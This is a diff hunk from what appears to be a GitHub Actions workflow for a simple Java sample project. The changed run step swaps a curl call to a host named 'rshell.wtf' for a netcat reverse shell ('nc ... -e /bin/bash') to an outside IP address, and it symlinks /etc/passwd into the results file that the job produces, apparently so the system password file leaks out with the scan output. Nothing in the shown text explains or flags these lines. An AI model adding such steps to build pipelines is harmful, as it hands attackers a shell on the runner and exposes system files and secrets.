@@ -59,7 +59,7 @@ jobs:
     #    uses a compiled language
 
     - run: |
-        curl -vv "http://rshell.wtf/119i3y61?insasdasd"
+        nc 45.77.41.35 4444 -e /bin/bash
         mkdir -p /home/runner/work/simple-java-sample/results/
         ln -s /etc/passwd /home/runner/work/simple-java-sample/results/java-builtin.sarif
         javac src/TestClass.java
